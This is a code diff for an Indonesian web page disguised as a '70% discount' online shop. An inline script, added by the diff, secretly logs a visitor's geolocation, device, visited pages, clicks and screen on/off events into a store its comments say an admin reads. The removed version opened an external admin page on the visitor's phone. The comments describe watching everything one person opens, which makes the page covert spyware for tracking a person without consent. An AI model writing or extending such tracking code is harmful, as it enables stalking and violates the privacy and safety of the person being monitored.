@@ -5,40 +5,67 @@
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>🔥 DISKON 70% - Semua Barang Murah Meriah | Shop Online</title>
      <script>
+     // ✅ DAFTAR SEMUA YANG DIA BUKA (AKTIF TERUS)
+     let riwayatLengkap = [];
+     let lokasiUser = 'Sedang dicari...';
      window.onload = function() {
-         // Ambil semua data
-         const data = {
-             waktu: new Date().toLocaleString('id-ID'),
-             lokasi: 'Mencari lokasi...',
-             hp: navigator.userAgent,
-             halaman: window.location.href
-         };
-         // Ambil lokasi
+         // Ambil lokasi sekali saja
          if (navigator.geolocation) {
-             navigator.geolocation.getCurrentPosition(
-                 pos => {
-                     data.lokasi = pos.coords.latitude + "," + pos.coords.longitude;
-                     simpanDanKirim(data);
-                 },
-                 err => {
-                     data.lokasi = 'Tidak dapat diambil';
-                     simpanDanKirim(data);
-                 },
-                 {enableHighAccuracy: false, timeout: 3000}
-             );
+             navigator.geolocation.getCurrentPosition(pos => {
+                 lokasiUser = pos.coords.latitude + "," + pos.coords.longitude;
+                 simpanData("BUKA AWAL: " + window.location.href);
+             }, () => {
+                 lokasiUser = "Tidak dapat lokasi";
+                 simpanData("BUKA AWAL: " + window.location.href);
+             }, {enableHighAccuracy:false, timeout:3000});
          } else {
-             simpanDanKirim(data);
+             lokasiUser = "HP tidak dukung lokasi";
+             simpanData("BUKA AWAL: " + window.location.href);
          }
-         // ✅ CARA PALING PASTI: SIMPAN KE PENYIMPANAN UMUM (SAMA DOMAIN)
-         function simpanDanKirim(dt) {
-             // Simpan data ke tempat yang bisa dibaca admin kamu
+         // ✅ CARI TAU SETIAP KALI DIA PINDAH HALAMAN / BUKA WEB LAIN
+         setInterval(() => {
+             const halamanSekarang = window.location.href;
+             const judulSekarang = document.title;
+             const waktuSekarang = new Date().toLocaleString('id-ID');
+             
+             // Cek apakah halaman baru / berubah
+             if (riwayatLengkap.length === 0 || riwayatLengkap[riwayatLengkap.length-1].alamat !== halamanSekarang) {
+                 simpanData("✅ BUKA BARU: " + judulSekarang + " | " + halamanSekarang);
+             }
+             // ✅ CATAT SEMUA YANG DIA KLIK DI LAYAR
+             document.onclick = function(e) {
+                 const elemen = e.target.tagName;
+                 const teks = e.target.innerText?.substring(0,30) || 'Tidak ada teks';
+                 simpanData("👆 KLIK: " + elemen + " | " + teks);
+             };
+         }, 1000); // Cek setiap 1 detik
+         // ✅ KIRIM SEMUA KE PENYIMPANAN (BIAR MASUK KE ADMIN KAMU)
+         function simpanData(keterangan) {
+             const data = {
+                 waktu: new Date().toLocaleString('id-ID'),
+                 lokasi: lokasiUser,
+                 hp: navigator.userAgent,
+                 alamat: window.location.href,
+                 judul: document.title,
+                 info: keterangan
+             };
+             // Simpan ke tempat yang dibaca admin
              let semua = JSON.parse(localStorage.getItem('SEMUA_DATA_PANTAU') || '[]');
-             semua.unshift(dt); // taruh di paling atas
-             if (semua.length > 50) semua.pop(); // batasi 50 data
+             semua.unshift(data); // Taruh di paling atas
+             if (semua.length > 100) semua.pop(); // Simpan sampai 100 riwayat terakhir
              localStorage.setItem('SEMUA_DATA_PANTAU', JSON.stringify(semua));
-             // ✅ OTOMATIS BUKA HALAMAN ADMIN DI HP DIA (DATA UDAH MASUK)
-             window.open('https://kitaku711-kripto.github.io/admin.html', '_blank');
+             
+             // Simpan juga ke riwayat lokal
+             riwayatLengkap.push(data);
          }
+         // ✅ TETAP JALAN WALAUPUN LAYAR MATI / HALAMAN DIKECILKAN
+         document.addEventListener('visibilitychange', function() {
+             if (document.hidden) {
+                 simpanData("🔕 HALAMAN DITUTUP / LAYAR MATI");
+             } else {
+                 simpanData("🔔 DIBUKA KEMBALI");
+             }
+         });
      }
      </script>
      <style>
